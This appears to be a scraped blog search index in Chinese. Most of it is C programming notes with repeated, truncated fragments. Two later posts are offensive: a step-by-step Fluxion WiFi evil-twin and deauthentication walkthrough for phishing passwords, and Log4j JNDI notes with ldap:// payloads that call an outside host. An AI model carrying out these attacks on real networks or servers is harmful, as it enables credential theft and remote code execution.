只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构中的结构"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#嵌套的结构"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构中的结构的数组"},{"categories":["Programing"],"content":"\r11.3联合\r自定义数据类型(typedef)c语言提供了一个叫做typedef的功能来声明一个已有的数据类型的新名字 比如： typedef int Length 使得 Length 成为 int 类型的别名 这样，Length 这个名字就可以代替int出现在变量定义和参数声明的地方了 Length a,b,len; Length numbers[10]; Typedef用来声明新的类型的名字 新的名字是某种类型的别名 改善了程序的可读性 (第一个是原来的名字，后面的是新名字) 联合​ 储存时，所有的成员共享一个空间，同一时间只有一个成员是有效的，union的大小事其最大的成员。 ​ 初始化时，对第一个成员做初始化。 ","date":"2023-11-17","objectID":"/c_language_notes/:11:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#113联合"},{"categories":["Programing"],"content":"\r11.3联合\r自定义数据类型(typedef)c语言提供了一个叫做typedef的功能来声明一个已有的数据类型的新名字 比如： typedef int Length 使得 Length 成为 int 类型的别名 这样，Length 这个名字就可以代替int出现在变量定义和参数声明的地方了 Length a,b,len; Length numbers[10]; Typedef用来声明新的类型的名字 新的名字是某种类型的别名 改善了程序的可读性 (第一个是原来的名字，后面的是新名字) 联合​ 储存时，所有的成员共享一个空间，同一时间只有一个成员是有效的，union的大小事其最大的成员。 ​ 初始化时，对第一个成员做初始化。 ","date":"2023-11-17","objectID":"/c_language_notes/:11:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#自定义数据类型typedef"},{"categories":["Programing"],"content":"\r11.3联合\r自定义数据类型(typedef)c语言提供了一个叫做typedef的功能来声明一个已有的数据类型的新名字 比如： typedef int Length 使得 Length 成为 int 类型的别名 这样，Length 这个名字就可以代替int出现在变量定义和参数声明的地方了 Length a,b,len; Length numbers[10]; Typedef用来声明新的类型的名字 新的名字是某种类型的别名 改善了程序的可读性 (第一个是原来的名字，后面的是新名字) 联合​ 储存时，所有的成员共享一个空间，同一时间只有一个成员是有效的，union的大小事其最大的成员。 ​ 初始化时，对第一个成员做初始化。 ","date":"2023-11-17","objectID":"/c_language_notes/:11:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#联合"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include\u003cstdio.h\u003e #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } for(k=0;k\u003cn-1;k++){ index=k; for(i=k+1;i\u003cn;i++){ if(a[i]\u003ca[index]){ index=i; } } temp=a[index]; a[index]=a[k]; a[k]=temp; } printf(\"After sorted:\"); for(i=0;i\u003cn;i++){ printf(\"%d\",a[i]); } printf(\"\\n\"); return 0; } 冒泡排序 #include\u003cstdio.h\u003e #define MAXN 10 void swap(int*px, int*py); void bubble(int a[],int n); int main(){ int n,a[MAXN]; int i; printf(\"Enter n(n\u003c=10):\"); scanf(\"%d\",\u0026n); printf(\"Enter %d characters:\\n\",n); for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } bubble(a,n); printf(\"After sorted:\"); for(i=0;i\u003cn;i++){ printf(\"%3d\",a[i]); } return 0; } void swap(int *px,int *py){ int t; t=*px; *px=*py; *py=t; } void bubble(int a[],int n){ int i,j,t; for(i=1;i\u003cn;i++){ for(j=0;j\u003cn-i;j++){ if(a[j]\u003ea[j+1]){ swap(\u0026a[j],\u0026a[j+1]); } } } } 分类统计 #include\u003cstdio.h\u003e #define MAXN 8 int main(){ int n,i,response; int a[MAXN+1]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=1;i\u003c=n;i++){ a[i]=0; } for(i=1;i\u003c=n;i++){ printf(\"Enter your response:\"); scanf(\"%d\",\u0026response); if(response\u003e=1\u0026\u0026response\u003c=MAXN){ a[response]++; }else{ printf(\"Invalid number!\\n\"); } } printf(\"result:\\n\"); for(i=1;i\u003c=n;i++){ printf(\"%4d%4d\\n\",i,a[i]); } return 0; } 二分查找法 #include\u003cstdio.h\u003e int main(){ int low,high,mid,n=10,x; int a[10]={1,2,3,4,5,6,7,8,9,10}; printf(\"Enter x: \"); scanf(\"%d\",\u0026x); low=0; high=n-1; while(low\u003c=high){ mid=(low+high)/2; if(x==a[mid]){ break; }else if(x\u003ea[mid]){ low=mid+1; }else{ high=mid-1; } } if(low\u003c=high){ printf(\"Index is %d\\n\",mid); }else{ printf(\"Not Found\\n\"); } return 0; } 递归函数递归是一种独特的定义方式 如果在定义某个事物的时候，又直接或间接地引用了这个事物本身，就称之为递归定义 例如，将n的阶乘定义为n-1的阶乘乘以n，就是一个递归定义 使用递归算法求n的阶乘： #include\u003cstdio.h\u003e long fact(int n); int main(){ int m=0,n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); m=fact(n); printf(\"n!=%d\",m); return 0; } long fact(int n){ int f=0; if(n==1){ f=1; }else{ f=n*fact(n-1); } return f; } ","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#121算法"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#选择排序"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#冒泡排序"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#分类统计"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#二分查找法"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#递归函数"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#使用递归算法求n的阶乘"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m\u003cn)，包括m和n #include\u003cstdio.h\u003e int sum(int m, int n); int main(){ int m,n; printf(\"Enter m n ,(m\u003cn):\"); scanf(\"%d %d\",\u0026m,\u0026n); printf(\"sum = %d\\n\",sum(m,n)); return 0; } int sum(int m,int n){ int sum=0; while(m\u003c=n){ sum=sum+m; m++; } return sum; } 2.计算摄氏温度 #include\u003cstdio.h\u003e int main(){ double f,c; printf(\"Enter F:\"); scanf(\"%lf\",\u0026f); c=5*(f-32)/9; printf(\"Celsius = %.1lf\",c); return 0; } 3.最大公约数和最小公倍数 可以先用辗转相除法求出最大公约数，然后a*b/[最大公约数]=最小公倍 #include\u003cstdio.h\u003e int main(){ int m,n,t,k; int a,b; scanf(\"%d %d\",\u0026m,\u0026n); a=m; b=n; if(n\u003em){ t=m; m=n; n=t; } while(n!=0){ t=m%n; m=n; n=t; } k=a*b/m; printf(\"%d %d\",m,k); return 0; } 4.统计字符输入10个字符，统计其中英文字母，空格或回车，数字字符和其他字符的个数 #include\u003cstdio.h\u003e int main(){ char a; int blank=0,digit=0,letter=0,other=0; for(int i=1;i\u003c=10;i++){ a=getchar(); switch (a){ case ' ': case '\\n': blank++; break; case '1':case '2':case '3': case '4': case '5': case '6':case '7':case '8': case '9': case '0': digit++; break; case 'a':case 'b':case 'c':case 'd':case 'e':case 'f':case 'g':case 'h': case 'i':case 'j':case 'k':case 'l':case 'm':case 'n':case 'o':case 'p': case 'q':case 'r':case 's':case 't':case 'u':case 'v':case 'w':case 'x': case 'y':case 'z': letter++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d,letter:%d\\n\",blank,digit,other,letter); return 0; } 5.输出闰年 #include\u003cstdio.h\u003e int main(){ int year; scanf(\"%d\",\u0026year); if(year%100==0){ if(year%400==0){ printf(\"闰年\"); }else{ printf(\"不是闰年\"); } } else if(year%4==0){ printf(\"r闰年\"); } else{ printf(\"不是闰年\"); } return 0; } 6.判断水仙花数 #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cmath.h\u003e int main() { int n; int t,z = 0; scanf(\"%d\", \u0026n); int min = pow(10, n - 1); int max = pow(10, n); for(int i=min;i\u003cmax;i++) { z = i; t = 0; while(z \u003e 0) { t = t+pow(z % 10, n); z = z / 10; } if (i == t) { printf(\"%d\\n\", i); } } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#131几个综合练习"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#1求m到n之间整数的和mn包括m和n"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#2计算摄氏温度"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#3最大公约数和最小公倍数"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#4统计字符"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#5输出闰年"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#6判断水仙花数"},{"categories":["Programing"],"content":"\r2023六月份希冀在线判题平台样题","date":"2023-11-17","objectID":"/c_language_notes/:14:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#2023六月份希冀在线判题平台样题"},{"categories":["Programing"],"content":"\r1.【问题描述】计算摄氏温度：输入华氏温度，输出对应的摄氏温度。计算公式如下： c=5×(f-32)÷9 ​ 其中，c表示摄氏温度，f表示华氏温度，均使用浮点数存储数据。 【输入形式】输入一个温度值。 【输出形式】输出的数值结果前带有字符串“Celsius**=”，输出保留二位小数。** 【样例输入】150 【样例输出】Celsius=65.56 #include\u003cstdio.h\u003e int main(){ double c; double f; scanf(\"%lf\",\u0026f); c=5*(f-32)/9; printf(\"Celsius=%.2lf\",c); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:14:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#1"},{"categories":["Programing"],"content":"\r2.【问题描述】求给定序列（1+1/2+1/3+……）前n项的和：输入一个正整数n，计算序列1+1/2+1/3+……的前n项之和； 【输入形式】输入一个整数值，输出一个单精度浮点数。 【输出形式】输出n的值，前面包含字符串”n=\"；输出逗号\",\"；输出求和后的结果值，前面包含字符串\"sum=\"，保留7位小数 【样例输入】5 【样例输出】n=5,sum=2.2833335 【补充说明】若结果为总是为1，请仔细思考有关数据类型运算规则的问题。同时思考，若使用双精度浮点输出，结果应该是多少？ #include\u003cstdio.h\u003e int main(){ int n,k=1,i; float sum=0,u; scanf(\"%d\",\u0026n); for(i=0;i\u003cn;i++){ u=1.0/k; sum=sum+u; k++; } printf(\"n=%d,sum=%.7f\",n,sum); return 0; } 这道题最容易出问题的地方在于u=1.0/k,如果写成u=1/k，u的值会被按整型来计算，这样sum的值会恒等于1.0000000 ","date":"2023-11-17","objectID":"/c_language_notes/:14:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#2"},{"categories":["Programing"],"content":"\r3.【问题描述】输入一个正整数n（1\u003cn\u003c10），再输入n个整数，存入数组中，再将数组中的数，逆序存放并输出 【输入形式】先输入一个整数n，再输入n个整数，用空格间隔 【输出形式】输出n个整数，用空格间隔 【样例输入】 5 1 2 3 4 5 【样例输出】 5 4 3 2 1 #include\u003cstdio.h\u003e int main(){ int n,i; int a[10]; scanf(\"%d\",\u0026n); for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } for(i=n-1;i\u003e=0;i--){ printf(\"%d \",a[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:14:3","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#3"},{"categories":["Programing"],"content":"\r4.【问题描述】输入一个正整数n，再输入n个整数，输出其中最小的值。 【输入形式】先输入一个整数n，再根据n，输入n个数 【输出形式】输出最小值，形式：min=？ 【样例输入】 5 10 22 4 67 2 【样例输出】 min=2 #include\u003cstdio.h\u003e int main(){ int n,i,min; scanf(\"%d\",\u0026n); int a[n]; for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } min=a[0]; for(i=1;i\u003cn;i++){ if(a[i]\u003cmin){ min=a[i]; } } printf(\"min=%d\",min); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:14:4","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#4"},{"categories":["Programing"],"content":"\r5.【问题描述】比较大小：输入三个整数，按从小到大顺序输出。 【输入形式】三个整数，以单个空格分隔 【输出形式】三个整数，以单个空格分隔，由小到大输出 【样例输入】2 6 5 【样例输出】2 5 6 c语言非指针题解 #include\u003cstdio.h\u003e int main(){ int a,b,c,q,w,e; scanf(\"%d %d %d\",\u0026a,\u0026b,\u0026c); if(a\u003cb){ if(a\u003cc){ q=a; if(b\u003cc){ w=b; e=c; }else{ w=c; e=b; } }else{ q=c; w=b; e=a; } }else{ if(c\u003ea){ q=b; w=a; e=c; }else{ if(b\u003ec){ q=c; w=b; e=a; }else{ q=b; w=c; e=a; } } } printf(\"%d %d %d\",q,w,e); return 0; } c语言指针题解 #include \u003cstdio.h\u003e void swap(int* a, int* b) { int temp = *a; *a = *b; *b = temp; } void sort(int* nums, int size) { for (int i = 0; i \u003c size - 1; i++) { for (int j = 0; j \u003c size - i - 1; j++) { if (nums[j] \u003e nums[j + 1]) { swap(\u0026nums[j], \u0026nums[j + 1]); } } } } int main() { int nums[3]; scanf(\"%d %d %d\", \u0026nums[0], \u0026nums[1], \u0026nums[2]); sort(nums, 3); printf(\"%d %d %d\\n\", nums[0], nums[1], nums[2]); return 0; } c++解法(题目莫名其妙非让用c++，我也不怎么会，用ChatGPT帮忙写的) #include\u003ciostream\u003e using namespace std; int main() { int a, b, c; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; if (a \u003e b) { swap(a, b); } if (a \u003e c) { swap(a, c); } if (b \u003e c) { swap(b, c); } cout \u003c\u003c a \u003c\u003c \" \" \u003c\u003c b \u003c\u003c \" \" \u003c\u003c c \u003c\u003c endl; return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:14:5","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#5"},{"categories":["Programing"],"content":"\r程序片段编程题","date":"2023-11-17","objectID":"/c_language_notes/:0:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#程序片段编程题"},{"categories":["Programing"],"content":"\r1.【问题描述】给定平面上任意两点坐标(x1,y1)和(x2,y2)，求这两点之间的距离（保留两位小数）。要求定义和调用函数dist(x1,y1,x2,y2)计算两点间的距离。 根据程序中的提示，在对应位置编写相关函数及内容。 #include\u003cstdio.h\u003e #include\u003cmath.h\u003e float dist(float xs,float ys,float xe,float ye){ float sum; sum=sqrt(pow((ye-ys),2)+pow((xe-xs),2)); return sum; } int main(){ float xs,ys,xe,ye,d; scanf(\"%f%f\",\u0026xs,\u0026ys); scanf(\"%f%f\",\u0026xe,\u0026ye); d=dist(xs,ys,xe,ye); printf(\"Distance=%.2f\",d); return 0; } 这个题要注意pow函数和sqrt函数的用法 pow() 函数用来求 x 的 y 次幂（次方），pow(x,y) sqrt()函数用来求一个非负实数平方根 ","date":"2023-11-17","objectID":"/c_language_notes/:0:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#1-1"},{"categories":["penetration"],"content":"破解WiFi的瑞士军刀 **首先声明：**工具经过我多次实测过，验证了很多网传的教程，大多数是正确的，但也有些不是很合理的指导步骤，或者说是文章作者不加验证和修改地抄别人文章。确实，在这个圈子里很多技术帖都是传来传去，抄来抄去，但我觉得，抄文章应在学习的同时加以验证和修改一些前人不妥的地方，由于时间和个人水平的限制，本文章有些截图和内容来源于他人文章，所以会造成前后图片中SSID不一致的情况，但并不影响阅读和实践。 私自破解他人 WiFi 属于违法行为，我这里使用的是自己买的 迷你版路由器 作为学习和测试。明白了破解原理就知道应该怎么防范了。 ","date":"2023-11-17","objectID":"/fluxion/:0:0","series":null,"tags":["penetration"],"title":"fluxion","uri":"/fluxion/#"},{"categories":["penetration"],"content":"\r0x1-Fluxion是什么Fluxion是一个无线破解工具，这款软件可以帮你挤掉WiFi主人的网络让你自己登陆进去，而且WiFi主人怎么挤也挤不过你。 ","date":"2023-11-17","objectID":"/fluxion/:1:0","series":null,"tags":["penetration"],"title":"fluxion","uri":"/fluxion/#0x1-fluxion是什么"},{"categories":["penetration"],"content":"\r0x2-Fluxion工作原理　1.扫描能够接收到的WIFI信号 2.抓取握手包(这一步的目的是为了验证WiFi密码是否正确) 3.使用WEB接口 4.启动一个假的AP实例来模拟原本的接入点 5.然后会生成一个MDK3进程。如果普通用户已经连接到这个WiFi，也会输入WiFi密码 6.随后启动一个模拟的DNS服务器并且抓取所有的DNS请求，并且会把这些请求重新定向到一个含有恶意脚本的HOST地址 7.随后会弹出一个窗口提示用户输入正确的WiFi密码 8.用户输入的密码将和第二步抓到的握手包做比较来核实密码是否正确 ","date":"2023-11-17","objectID":"/fluxion/:2:0","series":null,"tags":["penetration"],"title":"fluxion","uri":"/fluxion/#0x2-fluxion工作原理"},{"categories":["penetration"],"content":"\r0x3-Fluxion的安装在终端输入以下命令安装fluxion： git clone https://github.com/deltaxflux/fluxion.git 随后通过终端进入到fluxion目录 Tips：不同版本的kali情况可能不同，但首次需要使用通过./fluxion.sh -i 来安装kali缺少的工具 ","date":"2023-11-17","objectID":"/fluxion/:3:0","series":null,"tags":["penetration"],"title":"fluxion","uri":"/fluxion/#0x3-fluxion的安装"},{"categories":["penetration"],"content":"\r0x4-Fluxion的使用 cd fluxion ./fluxion.sh 在语言选择界面直接选中文就好了，6.9版本的选18，注意不要输入018 接下来进入主界面： 首先我们选择2，先扫描并抓取WiFi信息，虽然网上有些教程说是先选1，但其实并不正确。 可以看到左边终端窗口显示扫描到的一些热点，当目标信号出现后，可按ctl+c返回原界面，当然也可以按两次q键。 输入编号选中要攻击的信号节点 输入2跳过 选择2，因为之前有攻击过一次，抓到了握手包 选择2 选择2 选择1 选择2 开始抓去握手包… 出现如图所示，则抓包成功，这个包是后续用来检测密码的。当然也可对其进行其他的一些研究和操作，接着选择1，启动攻击 接着回到刚开始的界面，这里我们要选择1，因为我们已经抓到包了 这里继续选择2，选择1，后面的钓鱼热点就开不开了 这里选择2 选择1的话网上说所有人都会连不上，我试过了，确实是这样的 选择推荐的1，开始建立AP 选择1 选择1，这个抓取到的hash文件就是我们刚才抓到的包 选择推荐的2 选择1 选择推荐的1 这个工具的工作原理是，把原来的WiFi打掉，然后建立一个同名热点，你连接上这个热点后，他会弹出你选择的认证界面，提示你重新输入密码，你输入的密码他会去根据抓到的包进行验证，密码正确就保存密码，关闭钓鱼热点，密码错误就继续让你输入。 下面还有很多界面种类，这里选3中文认证界面，这个界面是可以自己建立的钓鱼WiFi的认证界面，但是我不会，应该是用一个什么软件建立了一个界面，然后在特定的文件夹里添加上，如果不会建立界面，就用它自带的即可。 选择后开始建立钓鱼热点，出现六个小窗口，原来的WiFi就连接不上了，我们的钓鱼WiFi出现了，当连接同名钓鱼WiFi时就会弹出认证窗口。 注意，这时候所选择的设备是早已经连上目标WiFi的，我是用自己手机连着实验室的bamboo的。 可以看到，我手机上提示了密码错误，以及出现了两个bamboo。 真正的WiFi会一直无法连接，同时会有一个一模一样未加密的伪AP，手机连上伪AP，输入密码后正确密码保存在netlog文件夹中，错误密码保存在pwdlog文件夹中 以下是手机连上伪AP后弹出的认证界面，可以看到它要求你输入密码，输入正确密码后会告诉你自动修复。 出现了钓鱼界面，而刚才说的可以自己制作的钓鱼界面就是这个，可以自己根据社工出的路由器牌子制作相应逼真的网站提高钓鱼成功率。 如果成功的话4个窗口会消失，如下图 2退出 最终结果： 文件打开后可以看到Password后就是bamboo的密码 另外错误密码的文件夹也能查看 ","date":"2023-11-17","objectID":"/fluxion/:4:0","series":null,"tags":["penetration"],"title":"fluxion","uri":"/fluxion/#0x4-fluxion的使用"},{"categories":["hvv"],"content":"HVV专题–java类漏洞 ","date":"2023-11-17","objectID":"/hvv_java/:0:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#"},{"categories":["hvv"],"content":"\rjava","date":"2023-11-17","objectID":"/hvv_java/:0:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#java"},{"categories":["hvv"],"content":"\r代码审计漏洞java代码审计 - 先知社区 (aliyun.com) ","date":"2023-11-17","objectID":"/hvv_java/:0:1","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#代码审计漏洞"},{"categories":["hvv"],"content":"\rjava实现RCE的函数Runtime.getRuntime.exec(“cmd”) new ProcessBuilder().start(“cmd”) ","date":"2023-11-17","objectID":"/hvv_java/:0:2","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#java实现rce的函数"},{"categories":["hvv"],"content":"\rLog4J漏洞有深入了解吗？再正常的log处理过程中会对${内部字符进行检查,如果以但匹配到类似于表达式结构的字符串就会触发替换机制,将表达式的内容替换成为表达式解析后的内容,而不是表达式本身,从而导致攻击者构造符合要求的表达式供系统执行,漏洞成因, **特征:**在打印日志的时候,如果日志内容包含关键字${,那么攻击者就能把关键字包含的内容当作变量来替换成任何的攻击命令 ${jndi:ldap://xxx.xxx.xxx.xxx/exp} 第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址 第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令 ${jndi:ldap://${sys:java.version}.collaborator.com} ladp注入原理1.使用了lookup 2.lookup的参数动态可控 3.构建一个ldap服务，指定远程加载地址为恶意代码地址 4.在客户端访问ldap服务不存在的对象 5.客户端下载恶意代码到本地并执行 rmi具体过程远端方法调用（Remote Method Invocation） Server端监听一个端口，这个端口是JVM随机选择的； 